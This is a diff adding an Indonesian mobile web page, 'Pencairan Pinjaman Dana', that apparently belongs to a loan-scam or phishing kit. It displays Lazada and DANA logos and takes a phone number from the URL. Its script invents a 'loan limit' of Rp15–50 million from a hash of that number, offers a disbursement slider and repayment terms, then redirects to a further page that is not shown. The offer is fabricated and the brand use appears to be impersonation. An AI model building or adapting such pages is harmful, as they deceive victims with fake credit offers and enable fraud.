@@ -1,0 +1,2177 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width,
+initial-scale=1.0,
+maximum-scale=1.0,
+user-scalable=no">
+
+<title>Pencairan Dana</title>
+
+<style>
+
+  /* ==========================
+   RESET
+========================== */
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:"Segoe UI",sans-serif;
+-webkit-tap-highlight-color:transparent;
+}
+
+html,
+body{
+width:100%;
+min-height:100%;
+}
+
+/* ==========================
+BODY
+========================== */
+
+body{
+
+min-height:100vh;
+
+padding:12px;
+
+display:flex;
+justify-content:center;
+align-items:flex-start;
+
+overflow-x:hidden;
+
+background:
+radial-gradient(
+circle at top left,
+rgba(110,215,255,.22),
+transparent 28%
+),
+radial-gradient(
+circle at top right,
+rgba(255,255,255,.12),
+transparent 30%
+),
+radial-gradient(
+circle at bottom right,
+rgba(0,110,255,.18),
+transparent 42%
+),
+linear-gradient(
+180deg,
+#12a9ff 0%,
+#0a8cf0 38%,
+#0677df 72%,
+#055fcb 100%
+);
+
+background-attachment:fixed;
+
+color:#fff;
+
+}
+
+/* Glow Background */
+
+body::before{
+
+content:"";
+
+position:fixed;
+
+inset:0;
+
+pointer-events:none;
+
+background:
+
+radial-gradient(
+circle at 18% 18%,
+rgba(255,255,255,.13),
+transparent 24%
+),
+
+radial-gradient(
+circle at 82% 82%,
+rgba(255,255,255,.08),
+transparent 28%
+);
+
+filter:blur(26px);
+
+z-index:-2;
+
+}
+
+/* ==========================
+BACKGROUND EFFECT
+========================== */
+
+.bg{
+
+position:fixed;
+
+inset:0;
+
+overflow:hidden;
+
+pointer-events:none;
+
+z-index:-1;
+
+}
+
+.bg::before{
+
+content:"";
+
+position:absolute;
+
+top:-80px;
+left:-80px;
+
+width:220px;
+height:220px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+circle,
+rgba(255,255,255,.18),
+transparent 72%
+);
+
+filter:blur(22px);
+
+animation:floatGlow1 8s ease-in-out infinite;
+
+}
+
+.bg::after{
+
+content:"";
+
+position:absolute;
+
+bottom:-90px;
+right:-70px;
+
+width:260px;
+height:260px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+circle,
+rgba(0,225,255,.16),
+transparent 72%
+);
+
+filter:blur(28px);
+
+animation:floatGlow2 10s ease-in-out infinite;
+
+}
+
+/* ==========================
+CONTAINER
+========================== */
+
+.container{
+
+position:relative;
+
+overflow:hidden;
+
+width:100%;
+max-width:430px;
+
+margin:auto;
+
+padding:18px;
+
+border-radius:28px;
+
+background:
+
+radial-gradient(
+circle at top left,
+rgba(255,255,255,.18),
+transparent 35%
+),
+
+linear-gradient(
+180deg,
+rgba(255,255,255,.18),
+rgba(255,255,255,.08)
+);
+
+backdrop-filter:blur(30px) saturate(180%);
+-webkit-backdrop-filter:blur(30px) saturate(180%);
+
+border:1px solid rgba(255,255,255,.28);
+
+box-shadow:
+
+0 25px 60px rgba(0,45,120,.28),
+
+inset 0 1px 0 rgba(255,255,255,.40),
+
+inset 0 -1px 0 rgba(255,255,255,.08);
+
+}
+
+/* Cahaya Atas */
+
+.container::before{
+
+content:"";
+
+position:absolute;
+
+top:-80px;
+right:-60px;
+
+width:180px;
+height:180px;
+
+border-radius:50%;
+
+background:
+
+radial-gradient(
+circle,
+rgba(255,255,255,.18),
+transparent 70%
+);
+
+filter:blur(24px);
+
+}
+
+/* Cahaya Bawah */
+
+.container::after{
+
+content:"";
+
+position:absolute;
+
+left:-70px;
+bottom:-90px;
+
+width:180px;
+height:180px;
+
+border-radius:50%;
+
+background:
+
+radial-gradient(
+circle,
+rgba(0,210,255,.15),
+transparent 72%
+);
+
+filter:blur(24px);
+
+}
+
+/* ==========================
+ANIMATION
+========================== */
+
+@keyframes floatGlow1{
+
+0%,100%{
+transform:translateY(0);
+}
+
+50%{
+transform:translateY(20px);
+}
+
+}
+
+@keyframes floatGlow2{
+
+0%,100%{
+transform:translateY(0);
+}
+
+50%{
+transform:translateY(-20px);
+}
+
+}
+
+/* ==========================
+HEADER
+========================== */
+
+.header{
+position:relative;
+overflow:hidden;
+
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+
+margin:0 0 22px;
+padding:22px 18px;
+
+border-radius:26px;
+
+background:
+radial-gradient(circle at top left,
+rgba(255,255,255,.20),
+transparent 35%),
+linear-gradient(
+180deg,
+rgba(255,255,255,.18),
+rgba(255,255,255,.08)
+);
+
+backdrop-filter:blur(28px) saturate(180%);
+-webkit-backdrop-filter:blur(28px) saturate(180%);
+
+border:1px solid rgba(255,255,255,.25);
+
+box-shadow:
+0 18px 45px rgba(0,60,150,.18),
+inset 0 1px 0 rgba(255,255,255,.35);
+}
+
+.header::before{
+content:"";
+
+position:absolute;
+
+top:-70px;
+right:-60px;
+
+width:170px;
+height:170px;
+
+border-radius:50%;
+
+background:
+radial-gradient(circle,
+rgba(255,255,255,.22),
+transparent 70%);
+
+filter:blur(18px);
+}
+
+/* ==========================
+LOGO
+========================== */
+
+.logo-wrap{
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+gap:16px;
+
+margin-bottom:18px;
+
+position:relative;
+
+}
+
+.logo-wrap::before{
+
+content:"";
+
+position:absolute;
+
+width:180px;
+height:90px;
+
+border-radius:50%;
+
+background:
+radial-gradient(circle,
+rgba(255,255,255,.18),
+transparent 70%);
+
+filter:blur(18px);
+
+z-index:-1;
+
+}
+
+.logo{
+
+width:88px;
+height:48px;
+
+padding:8px 14px;
+
+object-fit:contain;
+
+border-radius:16px;
+
+background:
+linear-gradient(
+180deg,
+rgba(255,255,255,.18),
+rgba(255,255,255,.08)
+);
+
+backdrop-filter:blur(18px);
+
+border:1px solid rgba(255,255,255,.25);
+
+box-shadow:
+0 12px 25px rgba(0,70,180,.18),
+inset 0 1px 0 rgba(255,255,255,.4);
+
+animation:logoFloat 4s ease-in-out infinite;
+}
+
+.left-logo{
+
+animation-delay:0s;
+
+}
+
+.right-logo{
+
+animation-delay:.5s;
+
+}
+
+.logo-divider{
+
+width:1px;
+height:34px;
+
+background:
+linear-gradient(
+180deg,
+transparent,
+rgba(255,255,255,.95),
+transparent
+);
+
+box-shadow:
+0 0 12px rgba(255,255,255,.7);
+
+}
+
+/* ==========================
+TITLE
+========================== */
+
+.header-title{
+
+text-align:center;
+
+}
+
+.header-title h2{
+
+font-size:25px;
+
+font-weight:800;
+
+letter-spacing:-.3px;
+
+color:#ffffff;
+
+text-shadow:
+0 3px 10px rgba(0,70,180,.35);
+
+margin-bottom:6px;
+
+}
+
+.header-title p{
+
+font-size:13px;
+
+line-height:1.5;
+
+color:rgba(255,255,255,.82);
+
+max-width:260px;
+
+margin:auto;
+
+}
+
+/* ==========================
+CARD
+========================== */
+
+.card{
+
+position:relative;
+overflow:hidden;
+
+margin-bottom:12px;
+
+padding:12px;
+
+border-radius:18px;
+
+background:
+linear-gradient(
+180deg,
+rgba(255,255,255,.22),
+rgba(255,255,255,.08)
+);
+
+backdrop-filter:blur(32px) saturate(200%);
+-webkit-backdrop-filter:blur(32px) saturate(200%);
+
+border:1px solid rgba(255,255,255,.20);
+
+box-shadow:
+0 10px 24px rgba(0,50,140,.10),
+0 2px 8px rgba(255,255,255,.05),
+inset 0 1px 0 rgba(255,255,255,.30);
+
+transition:
+all .28s cubic-bezier(.4,0,.2,1);
+
+animation:fadeUp .45s ease;
+
+}
+
+/* Premium Glow */
+
+.card::before{
+
+content:"";
+
+position:absolute;
+
+top:-55px;
+right:-55px;
+
+width:120px;
+height:120px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+circle,
+rgba(255,255,255,.16),
+transparent 72%
+);
+
+filter:blur(18px);
+
+pointer-events:none;
+
+}
+
+/* Blue Glow */
+
+.card::after{
+
+content:"";
+
+position:absolute;
+
+left:-60px;
+bottom:-70px;
+
+width:120px;
+height:120px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+circle,
+rgba(0,180,255,.10),
+transparent 72%
+);
+
+filter:blur(18px);
+
+pointer-events:none;
+
+}
+
+.card:active{
+
+transform:scale(.992);
+
+box-shadow:
+0 14px 30px rgba(0,110,255,.16),
+inset 0 1px 0 rgba(255,255,255,.36);
+
+}
+
+/* ==========================
+TITLE
+========================== */
+
+.title{
+
+display:flex;
+align-items:center;
+
+gap:8px;
+
+margin-bottom:10px;
+
+font-size:13px;
+
+font-weight:800;
+
+letter-spacing:.3px;
+
+color:#fff;
+
+text-shadow:
+0 0 8px rgba(255,255,255,.08);
+
+}
+
+.title i{
+
+width:26px;
+height:26px;
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+border-radius:9px;
+
+font-size:12px;
+
+color:#fff;
+
+background:
+linear-gradient(
+135deg,
+#53d7ff,
+#0d8cff
+);
+
+border:1px solid rgba(255,255,255,.20);
+
+box-shadow:
+0 5px 14px rgba(0,130,255,.24),
+inset 0 1px 0 rgba(255,255,255,.40);
+
+flex-shrink:0;
+
+}
+
+.title span{
+
+opacity:.92;
+
+}
+
+/* ==========================
+PHONE
+========================== */
+
+.phone-box{
+
+position:relative;
+
+display:flex;
+align-items:center;
+gap:10px;
+
+padding:10px 12px;
+
+border-radius:15px;
+
+overflow:hidden;
+
+background:
+linear-gradient(
+180deg,
+rgba(255,255,255,.18),
+rgba(255,255,255,.08)
+);
+
+backdrop-filter:blur(30px) saturate(180%);
+-webkit-backdrop-filter:blur(30px) saturate(180%);
+
+border:1px solid rgba(255,255,255,.18);
+
+box-shadow:
+0 8px 20px rgba(0,80,180,.08),
+inset 0 1px 0 rgba(255,255,255,.28);
+
+transition:.25s;
+
+}
+
+/* Glow */
+
+.phone-box::before{
+
+content:"";
+
+position:absolute;
+
+top:-45px;
+right:-45px;
+
+width:90px;
+height:90px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+circle,
+rgba(255,255,255,.16),
+transparent 72%
+);
+
+filter:blur(16px);
+
+pointer-events:none;
+
+}
+
+.phone-box::after{
+
+content:"";
+
+position:absolute;
+
+left:-45px;
+bottom:-45px;
+
+width:90px;
+height:90px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+circle,
+rgba(0,170,255,.10),
+transparent 72%
+);
+
+filter:blur(18px);
+
+pointer-events:none;
+
+}
+
+/* INPUT */
+
+.phone-box input{
+
+flex:1;
+
+border:none;
+outline:none;
+background:transparent;
+
+font-size:15px;
+font-weight:700;
+
+letter-spacing:1.2px;
+
+color:rgba(255,255,255,.68);
+
+text-shadow:
+0 0 8px rgba(255,255,255,.08);
+
+opacity:.75;
+
+caret-color:transparent;
+
+}
+
+/* ICON */
+
+.phone-box i{
+
+width:28px;
+height:28px;
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+flex-shrink:0;
+
+border-radius:9px;
+
+font-size:12px;
+
+color:#fff;
+
+background:
+linear-gradient(
+135deg,
+#5fd8ff,
+#1397ff
+);
+
+border:1px solid rgba(255,255,255,.20);
+
+box-shadow:
+0 5px 14px rgba(0,140,255,.22),
+inset 0 1px 0 rgba(255,255,255,.35);
+
+}
+
+/* Premium Touch */
+
+.phone-box:active{
+
+transform:scale(.995);
+
+box-shadow:
+0 10px 22px rgba(0,120,255,.12),
+inset 0 1px 0 rgba(255,255,255,.35);
+
+}
+
+/* ==========================
+LIMIT
+========================== */
+
+.limit{
+
+margin:2px 0 4px;
+
+text-align:center;
+
+font-size:26px;
+
+font-weight:800;
+
+letter-spacing:-.5px;
+
+color:#ffffff;
+
+text-shadow:
+0 1px 8px rgba(255,255,255,.18),
+0 0 18px rgba(0,170,255,.22);
+
+animation:fadeUp .45s ease;
+
+}
+
+.nominal{
+
+margin:2px 0 14px;
+
+text-align:center;
+
+font-size:23px;
+
+font-weight:900;
+
+letter-spacing:-.3px;
+
+color:#ffffff;
+
+text-shadow:
+0 1px 10px rgba(255,255,255,.15),
+0 0 16px rgba(0,180,255,.22);
+
+}
+
+/* ==========================
+SLIDER
+========================== */
+
+#slider{
+
+width:100%;
+
+height:7px;
+
+appearance:none;
+-webkit-appearance:none;
+
+border:none;
+outline:none;
+
+border-radius:999px;
+
+background:
+linear-gradient(
+90deg,
+rgba(255,255,255,.22),
+rgba(255,255,255,.08)
+);
+
+box-shadow:
+inset 0 1px 5px rgba(0,0,0,.10),
+0 3px 12px rgba(0,120,255,.10);
+
+}
+
+#slider::-webkit-slider-thumb{
+
+appearance:none;
+-webkit-appearance:none;
+
+width:22px;
+height:22px;
+
+border-radius:50%;
+
+cursor:pointer;
+
+background:
+radial-gradient(
+circle at 35% 35%,
+#ffffff,
+#73dcff 45%,
+#1594ff 100%
+);
+
+border:2px solid rgba(255,255,255,.70);
+
+box-shadow:
+0 0 14px rgba(0,190,255,.35),
+0 5px 12px rgba(0,120,255,.22),
+inset 0 1px 2px rgba(255,255,255,.50);
+
+transition:
+transform .2s,
+box-shadow .2s;
+
+}
+
+#slider::-webkit-slider-thumb:active{
+
+transform:scale(1.08);
+
+box-shadow:
+0 0 20px rgba(0,200,255,.45),
+0 8px 18px rgba(0,120,255,.28);
+
+}
+
+.slider-info{
+
+display:flex;
+justify-content:space-between;
+
+margin-top:8px;
+
+padding:0 2px;
+
+font-size:10px;
+
+font-weight:700;
+
+letter-spacing:.3px;
+
+color:rgba(255,255,255,.62);
+
+user-select:none;
+
+}
+
+/* ==========================
+TENOR
+========================== */
+
+.tenor-scroll{
+
+display:flex;
+
+gap:8px;
+
+overflow-x:auto;
+
+padding:2px 1px 6px;
+
+scrollbar-width:none;
+
+}
+
+.tenor-scroll::-webkit-scrollbar{
+
+display:none;
+
+}
+
+.tenor{
+
+position:relative;
+
+overflow:hidden;
+
+flex:0 0 82px;
+
+padding:11px 8px;
+
+text-align:center;
+
+border-radius:16px;
+
+cursor:pointer;
+
+background:
+linear-gradient(
+180deg,
+rgba(255,255,255,.18),
+rgba(255,255,255,.07)
+);
+
+backdrop-filter:blur(28px) saturate(180%);
+-webkit-backdrop-filter:blur(28px) saturate(180%);
+
+border:1px solid rgba(255,255,255,.18);
+
+box-shadow:
+0 6px 16px rgba(0,70,170,.08),
+inset 0 1px 0 rgba(255,255,255,.28);
+
+transition:
+all .25s cubic-bezier(.4,0,.2,1);
+
+}
+
+/* White Glow */
+
+.tenor::before{
+
+content:"";
+
+position:absolute;
+
+top:-35px;
+right:-35px;
+
+width:70px;
+height:70px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+circle,
+rgba(255,255,255,.14),
+transparent 72%
+);
+
+filter:blur(12px);
+
+pointer-events:none;
+
+}
+
+/* Blue Glow */
+
+.tenor::after{
+
+content:"";
+
+position:absolute;
+
+left:-35px;
+bottom:-35px;
+
+width:70px;
+height:70px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+circle,
+rgba(0,180,255,.10),
+transparent 72%
+);
+
+filter:blur(14px);
+
+pointer-events:none;
+
+}
+
+.tenor h3{
+
+font-size:20px;
+
+font-weight:900;
+
+line-height:1;
+
+margin-bottom:3px;
+
+color:#ffffff;
+
+text-shadow:
+0 0 8px rgba(0,180,255,.18);
+
+}
+
+.tenor p{
+
+font-size:10px;
+
+font-weight:600;
+
+letter-spacing:.2px;
+
+color:rgba(255,255,255,.66);
+
+}
+
+/* Active */
+
+.tenor.active{
+
+transform:
+translateY(-2px)
+scale(1.02);
+
+background:
+linear-gradient(
+135deg,
+#58d9ff,
+#1594ff
+);
+
+border:1px solid rgba(255,255,255,.35);
+
+box-shadow:
+0 10px 22px rgba(0,140,255,.26),
+inset 0 1px 0 rgba(255,255,255,.42);
+
+}
+
+.tenor.active h3{
+
+color:#fff;
+
+text-shadow:
+0 0 10px rgba(255,255,255,.18);
+
+}
+
+.tenor.active p{
+
+color:rgba(255,255,255,.92);
+
+}
+
+/* Press */
+
+.tenor:active{
+
+transform:scale(.98);
+
+}
+
+/* ==========================
+SUMMARY
+========================== */
+
+.summary{
+
+display:flex;
+flex-direction:column;
+
+gap:10px;
+
+}
+
+.row{
+
+display:flex;
+align-items:center;
+justify-content:space-between;
+
+padding:12px 14px;
+
+border-radius:14px;
+
+background:
+radial-gradient(
+circle at top left,
+rgba(255,255,255,.15),
+transparent 40%
+),
+
+linear-gradient(
+180deg,
+rgba(255,255,255,.12),
+rgba(255,255,255,.05)
+);
+
+backdrop-filter:blur(18px);
+-webkit-backdrop-filter:blur(18px);
+
+border:1px solid rgba(255,255,255,.16);
+
+box-shadow:
+0 6px 16px rgba(0,60,150,.08),
+inset 0 1px 0 rgba(255,255,255,.18);
+
+transition:.25s;
+
+}
+
+.row:active{
+
+transform:scale(.99);
+
+}
+
+.row span{
+
+font-size:12px;
+font-weight:600;
+
+color:rgba(255,255,255,.70);
+
+}
+
+.row b{
+
+font-size:13px;
+font-weight:800;
+
+color:#fff;
+
+text-shadow:
+0 0 8px rgba(255,255,255,.12);
+
+}
+
+
+/* ==========================
+INFO
+========================== */
+
+.info-box{
+
+position:relative;
+
+overflow:hidden;
+
+display:flex;
+align-items:flex-start;
+
+gap:12px;
+
+padding:14px;
+
+margin-top:2px;
+margin-bottom:20px;
+
+border-radius:18px;
+
+background:
+
+radial-gradient(
+circle at top left,
+rgba(255,255,255,.16),
+transparent 40%
+),
+
+linear-gradient(
+180deg,
+rgba(255,255,255,.15),
+rgba(255,255,255,.06)
+);
+
+backdrop-filter:blur(22px);
+-webkit-backdrop-filter:blur(22px);
+
+border:1px solid rgba(255,255,255,.20);
+
+box-shadow:
+0 10px 24px rgba(0,65,160,.12),
+inset 0 1px 0 rgba(255,255,255,.22);
+
+}
+
+.info-box::before{
+
+content:"";
+
+position:absolute;
+
+top:-45px;
+right:-45px;
+
+width:90px;
+height:90px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+circle,
+rgba(255,255,255,.14),
+transparent 72%
+);
+
+filter:blur(14px);
+
+}
+
+.info-box i{
+
+flex-shrink:0;
+
+width:36px;
+height:36px;
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+border-radius:12px;
+
+font-size:16px;
+
+color:#fff;
+
+background:
+linear-gradient(
+135deg,
+#3cc6ff,
+#0b84ef
+);
+
+box-shadow:
+0 8px 18px rgba(0,120,255,.25),
+inset 0 1px 0 rgba(255,255,255,.35);
+
+}
+
+.info-box p{
+
+font-size:12px;
+
+line-height:1.6;
+
+font-weight:500;
+
+color:rgba(255,255,255,.78);
+
+}
+
+/* ==========================
+BUTTON
+========================== */
+
+#nextBtn{
+
+position:relative;
+
+overflow:hidden;
+
+width:100%;
+height:54px;
+
+border:none;
+border-radius:18px;
+
+cursor:pointer;
+
+font-size:15px;
+font-weight:800;
+letter-spacing:.4px;
+
+color:#fff;
+
+background:
+linear-gradient(
+135deg,
+#4fd2ff 0%,
+#1697ff 45%,
+#0b84ef 100%
+);
+
+box-shadow:
+0 14px 32px rgba(0,120,255,.30),
+inset 0 1px 0 rgba(255,255,255,.35),
+inset 0 -2px 6px rgba(0,0,0,.08);
+
+transition:
+transform .25s,
+box-shadow .25s;
+
+}
+
+#nextBtn::before{
+
+content:"";
+
+position:absolute;
+
+top:0;
+left:-130%;
+
+width:60%;
+height:100%;
+
+background:
+linear-gradient(
+90deg,
+transparent,
+rgba(255,255,255,.45),
+transparent
+);
+
+transform:skewX(-20deg);
+
+transition:.8s;
+
+}
+
+#nextBtn:hover::before{
+
+left:140%;
+
+}
+
+#nextBtn:active{
+
+transform:scale(.98);
+
+box-shadow:
+0 10px 24px rgba(0,120,255,.25);
+
+}
+
+/* ==========================
+LOADING
+========================== */
+
+.loading{
+
+position:fixed;
+
+inset:0;
+
+display:none;
+justify-content:center;
+align-items:center;
+flex-direction:column;
+
+background:
+rgba(8,28,68,.45);
+
+backdrop-filter:blur(18px);
+-webkit-backdrop-filter:blur(18px);
+
+z-index:9999;
+
+}
+
+.loading.show{
+
+display:flex;
+
+}
+
+.loader{
+
+width:64px;
+height:64px;
+
+border-radius:50%;
+
+border:4px solid rgba(255,255,255,.15);
+border-top-color:#4fd2ff;
+
+animation:spin .9s linear infinite;
+
+box-shadow:
+0 0 24px rgba(0,180,255,.30);
+
+margin-bottom:18px;
+
+}
+
+.loading p{
+
+font-size:14px;
+font-weight:700;
+
+letter-spacing:.3px;
+
+color:#fff;
+
+opacity:.88;
+
+text-shadow:
+0 0 10px rgba(255,255,255,.15);
+
+}
+
+/* ==========================
+ANIMATION
+========================== */
+
+@keyframes spin{
+
+100%{
+
+transform:rotate(360deg);
+
+}
+
+}
+
+@keyframes fadeUp{
+
+from{
+
+opacity:0;
+
+transform:
+translateY(18px)
+scale(.98);
+
+}
+
+to{
+
+opacity:1;
+
+transform:
+translateY(0)
+scale(1);
+
+}
+
+}
+
+/* ==========================
+RESPONSIVE
+========================== */
+
+@media (max-width:420px){
+
+.container{
+
+padding:16px;
+
+}
+
+.limit{
+
+font-size:30px;
+
+}
+
+.nominal{
+
+font-size:26px;
+
+}
+
+.tenor{
+
+flex:0 0 88px;
+
+padding:12px 8px;
+
+}
+
+.tenor h3{
+
+font-size:24px;
+
+}
+
+.tenor p{
+
+font-size:10px;
+
+}
+
+.header-title h2{
+
+font-size:19px;
+
+}
+
+.header-title p{
+
+font-size:11px;
+
+}
+
+#nextBtn{
+
+height:52px;
+
+font-size:14px;
+
+}
+
+}
+  
+</style>
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
+</head>
+
+<body>
+
+<div class="bg"></div>
+
+<div class="container">
+
+    <!-- HEADER -->
+
+    <div class="header">
+
+    <div class="logo-wrap">
+
+        <img src="/assets/lazadax.png"
+        class="logo left-logo">
+
+        <div class="logo-divider"></div>
+
+        <img src="/assets/logo-dana.png"
+        class="logo right-logo">
+
+    </div>
+
+    <div class="header-title">
+
+        <h2>Pencairan Pinjaman Dana</h2>
+
+    </div>
+
+</div>
+
+
+    <!-- NOMOR -->
+
+    <div class="card">
+
+        <div class="title">
+
+            <i class="fa-solid fa-mobile-screen"></i>
+
+            Nomor Rekening Dana
+
+        </div>
+
+        <div class="phone-box">
+
+            <input
+            id="phone"
+            type="text"
+            readonly>
+
+            <i class="fa-solid fa-lock"></i>
+
+        </div>
+
+    </div>
+
+
+
+    <!-- LIMIT -->
+
+    <div class="card">
+
+        <div class="title">
+
+            <i class="fa-solid fa-wallet"></i>
+
+            Limit Tersedia
+
+        </div>
+
+        <div
+        id="limit"
+        class="limit">
+
+            Rp0
+
+        </div>
+
+    </div>
+
+
+
+    <!-- PENCAIRAN -->
+
+    <div class="card">
+
+        <div class="title">
+
+            <i class="fa-solid fa-money-bill-transfer"></i>
+
+            Nominal Pencairan
+
+        </div>
+
+        <div
+        id="nominalText"
+        class="nominal">
+
+            Rp500.000
+
+        </div>
+
+        <input
+        id="slider"
+        type="range"
+        min="500000"
+        max="500000"
+        step="500000"
+        value="500000">
+
+        <div class="slider-info">
+
+            <span>Rp500.000</span>
+
+            <span id="maxLimit">
+
+                Rp0
+
+            </span>
+
+        </div>
+
+    </div>
+
+
+
+    <!-- TENOR -->
+
+    <div class="card">
+
+        <div class="title">
+
+            <i class="fa-solid fa-calendar-days"></i>
+
+            Pilih Tenor
+
+        </div>
+
+        <div class="tenor-scroll">
+
+            <div
+            class="tenor active"
+            data-tenor="12">
+
+                <h3>12</h3>
+
+                <p>Bulan</p>
+
+            </div>
+
+            <div
+            class="tenor"
+            data-tenor="18">
+
+                <h3>18</h3>
+
+                <p>Bulan</p>
+
+            </div>
+
+            <div
+            class="tenor"
+            data-tenor="24">
+
+                <h3>24</h3>
+
+                <p>Bulan</p>
+
+            </div>
+
+            <div
+            class="tenor"
+            data-tenor="36">
+
+                <h3>36</h3>
+
+                <p>Bulan</p>
+
+            </div>
+
+        </div>
+
+    </div>
+
+
+
+    <!-- RINGKASAN -->
+
+    <div class="card">
+
+        <div class="title">
+
+            <i class="fa-solid fa-file-invoice"></i>
+
+            Ringkasan
+
+        </div>
+
+        <div class="summary">
+
+            <div class="row">
+
+                <span>Nomor</span>
+
+                <b id="sumPhone">-</b>
+
+            </div>
+
+            <div class="row">
+
+                <span>Limit</span>
+
+                <b id="sumLimit">Rp0</b>
+
+            </div>
+
+            <div class="row">
+
+                <span>Pencairan</span>
+
+                <b id="sumNominal">Rp500.000</b>
+
+            </div>
+
+            <div class="row">
+
+                <span>Tenor</span>
+
+                <b id="sumTenor">
+
+                    12 Bulan
+
+                </b>
+
+            </div>
+
+        </div>
+
+    </div>
+
+
+
+    <!-- INFO -->
+
+    <div class="info-box">
+
+        <i class="fa-solid fa-circle-info"></i>
+
+        <p>
+
+            Pastikan nomor tujuan sudah benar.
+            Nominal pencairan tidak dapat melebihi limit yang tersedia.
+
+        </p>
+
+    </div>
+
+
+
+    <!-- BUTTON -->
+
+    <button
+    id="nextBtn">
+
+        LANJUTKAN
+
+    </button>
+
+</div>
+
+
+
+<!-- LOADING -->
+
+<div
+id="loading"
+class="loading">
+
+    <div class="loader"></div>
+
+    <p>Memproses...</p>
+
+</div>
+
+
+
+<script>
+
+  /* =====================================
+   FORMAT RUPIAH
+===================================== */
+
+function rupiah(angka) {
+
+    return "Rp" + angka.toLocaleString("id-ID");
+
+}
+
+
+/* =====================================
+   AMBIL NOMOR DARI URL
+===================================== */
+
+const path = window.location.pathname.split("/");
+
+const phone = path[2];
+
+if (!phone) {
+
+    alert("Link tidak valid");
+
+    location.href = "/";
+
+}
+
+
+/* =====================================
+   TAMPILKAN NOMOR
+===================================== */
+
+const phoneInput = document.getElementById("phone");
+
+phoneInput.value = phone;
+
+document.getElementById("sumPhone").innerText = phone;
+
+
+/* =====================================
+   GENERATE LIMIT BERDASARKAN NOMOR
+   (SELALU TETAP)
+===================================== */
+
+function generateLimit(phone) {
+
+    let hash = 0;
+
+    for (let i = 0; i < phone.length; i++) {
+
+        hash += phone.charCodeAt(i) * (i + 1);
+
+    }
+
+    const min = 15000000;
+
+    const max = 50000000;
+
+    const step = 500000;
+
+    const totalStep = ((max - min) / step);
+
+    const index = hash % (totalStep + 1);
+
+    return min + (index * step);
+
+}
+
+const limit = generateLimit(phone);
+
+
+/* =====================================
+   TAMPILKAN LIMIT
+===================================== */
+
+document.getElementById("limit").innerText = rupiah(limit);
+
+document.getElementById("sumLimit").innerText = rupiah(limit);
+
+document.getElementById("maxLimit").innerText = rupiah(limit);
+
+
+/* =====================================
+   SLIDER
+===================================== */
+
+const slider = document.getElementById("slider");
+
+slider.min = 500000;
+
+slider.max = limit;
+
+slider.step = 500000;
+
+slider.value = 500000;
+
+
+const nominalText = document.getElementById("nominalText");
+
+const sumNominal = document.getElementById("sumNominal");
+
+
+function updateNominal() {
+
+    const nominal = Number(slider.value);
+
+    nominalText.innerText = rupiah(nominal);
+
+    sumNominal.innerText = rupiah(nominal);
+
+}
+
+slider.addEventListener("input", updateNominal);
+
+updateNominal();
+
+
+/* =====================================
+   TENOR
+===================================== */
+
+let selectedTenor = 12;
+
+const tenorCards = document.querySelectorAll(".tenor");
+
+tenorCards.forEach(card => {
+
+    card.addEventListener("click", () => {
+
+        tenorCards.forEach(x => {
+
+            x.classList.remove("active");
+
+        });
+
+        card.classList.add("active");
+
+        selectedTenor = Number(card.dataset.tenor);
+
+        document.getElementById("sumTenor").innerText =
+
+            selectedTenor + " Bulan";
+
+    });
+
+});
+
+
+/* =====================================
+   BUTTON LANJUT
+===================================== */
+
+const nextBtn = document.getElementById("nextBtn");
+
+const loading = document.getElementById("loading");
+
+nextBtn.addEventListener("click", () => {
+
+    loading.classList.add("show");
+
+    const data = {
+
+        phone: phone,
+
+        limit: limit,
+
+        nominal: Number(slider.value),
+
+        tenor: selectedTenor
+
+    };
+
+    sessionStorage.setItem(
+
+        "pencairan",
+
+        JSON.stringify(data)
+
+    );
+
+    setTimeout(() => {
+
+        location.href = "/pix.html";
+
+    }, 1500);
+
+});
+
+
+/* =====================================
+   BLOK COPY NOMOR
+===================================== */
+
+phoneInput.addEventListener("copy", e => {
+
+    e.preventDefault();
+
+});
+
+phoneInput.addEventListener("cut", e => {
+
+    e.preventDefault();
+
+});
+
+phoneInput.addEventListener("paste", e => {
+
+    e.preventDefault();
+
+});
+
+
+/* =====================================
+   EFEK GETAR SAAT LIMIT MUNCUL
+===================================== */
+
+setTimeout(() => {
+
+    document.getElementById("limit").animate([
+
+        {
+
+            transform: "scale(.9)"
+
+        },
+
+        {
+
+            transform: "scale(1.08)"
+
+        },
+
+        {
+
+            transform: "scale(1)"
+
+        }
+
+    ], {
+
+        duration: 500
+
+    });
+
+}, 300);
+  
+</script>
+
+</body>
+</html>
